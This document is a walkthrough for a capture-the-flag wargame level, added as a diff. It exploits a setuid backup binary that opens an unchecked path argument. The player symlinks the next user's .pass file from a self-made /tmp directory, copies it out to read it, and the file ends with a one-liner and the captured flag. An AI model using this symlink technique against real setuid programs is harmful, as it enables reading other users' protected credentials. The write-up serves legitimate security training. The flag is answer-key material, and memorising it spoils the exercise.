@@ -1,0 +1,80 @@
+# Level 08 Walkthrough - Setuid Backup Binary Symlink Read
+
+## 1.1 SSH into VM
+```
+sshpass -p `cat level07/flag` ssh -o StrictHostKeyChecking=no level08@localhost -p 4242
+```
+
+## Binary Behaviour
+
+`level08` is a setuid/setgid backup utility (owner: **level09**, group: **users**):
+
+1. Opens `./backups/.log` for writing (relative to CWD)
+2. Calls `log_wrapper` to log "Starting back up: <argv[1]>"
+3. Opens **argv[1]** directly with `fopen(argv[1], "r")` — no sanitisation
+4. Opens `./backups/<argv[1]>` with `O_WRONLY|O_CREAT|O_EXCL` as destination
+5. Copies source -> destination byte by byte via `fgetc` / `write`
+6. Logs "Finished back up: <argv[1]>", closes handles
+
+## Vulnerability
+
+`fopen(argv[1], "r")` accepts any path — including symlinks. Because the binary
+runs as **level09** (setuid), it can read `/home/users/level09/.pass` which is
+inaccessible to level08 directly.
+
+There is no restriction on the source path.
+
+## Filesystem Permissions
+
+The `backups/` directory has an ACL that only grants level08 `r-x`:
+
+```
+user::rwx
+user:level08:r-x      <- level08 cannot write here
+user:level09:r-x
+```
+
+So level08 cannot create files in the real backups dir.
+The workaround: run the binary from a **tmp directory we control**, where
+`./backups/` is a directory we created ourselves.
+
+The default ACL on newly created files (`default:user:level08:r-x`) means
+files written by the binary into our tmp backups dir are readable by level08.
+
+## Exploit Steps
+
+```bash
+# 1. Create working dir in /tmp with a backups/ subdirectory
+mkdir -p /tmp/l08work/backups
+
+# 2. Symlink our "source" name to the protected file
+ln -s /home/users/level09/.pass /tmp/l08work/level09pass
+
+# 3. Run the binary from /tmp/l08work — it opens ./backups/.log
+#    and ./backups/level09pass relative to our dir, not the real backups/
+cd /tmp/l08work
+/home/users/level08/level08 level09pass
+
+# 4. Read the copy — created with mode 0660, level08 has r via default ACL
+cat /tmp/l08work/backups/level09pass
+```
+
+## Why the Home Dir Backups Dir Doesn't Work
+
+`/home/users/level08/backups/` has an ACL that restricts level08 to `r-x`
+(no write). Attempts to `mkdir` or `ln` inside it fail with Permission Denied.
+Running from `/tmp/` sidesteps this because /tmp is world-writable and we
+own the directory we create there.
+
+## One-liner
+
+```bash
+mkdir -p /tmp/x/backups && \
+ln -s /home/users/level09/.pass /tmp/x/p && \
+cd /tmp/x && /home/users/level08/level08 p && \
+cat /tmp/x/backups/p
+```
+
+## Flag
+
+`fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S`
